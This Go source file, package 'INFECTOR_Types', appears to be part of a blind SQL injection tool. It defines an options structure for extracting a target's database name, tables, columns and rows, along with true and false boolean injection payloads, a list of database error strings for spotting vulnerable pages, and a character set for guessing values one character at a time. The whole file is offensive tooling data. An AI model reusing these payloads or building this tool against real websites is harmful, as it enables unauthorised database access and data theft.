package INFECTOR_Types

import "net/url"

var Options struct {
	Parameter       string
	ParameterValue  string
	URL             *url.URL
	firstLen        int
	Payload         int
	DBNameLen       int
	DBName          string
	DBTableCount    int
	DBTablesColumns map[string][]string
	DBTablesRows    map[int][]string
}

var Payloads = map[int]string{
	1: "' AND '1' = '1",
	2: "' AND '1' = '1'",
	3: " AND '1' = '1'",
	4: " AND 1 = 1",
	5: " AND 1 = 1'",
	6: "'AND 1 = 1'",
}

var NegativePayloads = map[int]string{
	1: "' AND '1' = '2",
	2: "' AND '1' = '2'",
	3: " AND '1' = '2'",
	4: " AND 1 = 2",
	5: " AND 1 = 2'",
	6: "'AND 1 = 2'",
}

var ErrPayloads = []string{
	"Fatal error:",
	"error in your SQL syntax",
	"mysql_num_rows()",
	"mysql_fetch_array()",
	"Error Occurred While Processing Request",
	"Server Error in '/' Application",
	"mysql_fetch_row()",
	"Syntax error",
	"mysql_fetch_assoc()",
	"mysql_fetch_object()",
	"mysql_numrows()",
	"GetArray()",
	"FetchRow()",
	"Input string was not in a correct format",
	"You have an error in your SQL syntax",
	"Warning: session_start()",
	"Warning: is_writable()",
	"Warning: Unknown()",
	"Warning: mysql_result()",
	"Warning: mysql_query()",
	"Warning: mysql_num_rows()",
	"Warning: array_merge()",
	"Warning: preg_match()",
	"SQL syntax error",
	"MYSQL error message: supplied argument….",
	"mysql error with query",
}

var Characters = []string{
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "_", "", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "@", ".",
}
